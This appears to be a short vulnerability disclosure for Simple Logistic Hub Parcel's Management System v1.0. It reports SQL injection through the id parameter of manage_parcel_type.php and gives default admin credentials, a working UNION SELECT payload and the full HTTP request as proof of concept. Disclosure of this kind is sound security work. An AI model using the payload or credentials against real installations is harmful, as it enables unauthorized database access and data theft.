# Simple Logistic Hub Parcel's Management System v1.0 by Sourcecodester has SQL injection 1

BUG_Author: Liu Lanling

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15051/simple-logistic-hub-parcels-management-system-php-and-sqlite-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /lhpms/manage_parcel_type.php

Vulnerability location: /lhpms/manage_parcel_type.php?id=, id

[+] Payload: /lhpms/manage_parcel_type.php?id=1%27%20union%20select%201,sqlite_version(),3,4--+ // Leak place ---> id

```sql
GET /lhpms/manage_parcel_type.php?id=1%27%20union%20select%201,sqlite_version(),3,4--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=aql25isdr8lel085k89oteptif
Connection: close


```
<img width="1133" height="440" alt="image" src="https://github.com/user-attachments/assets/bb5e9a94-bc5c-48ef-831d-ddc13175fc78" />
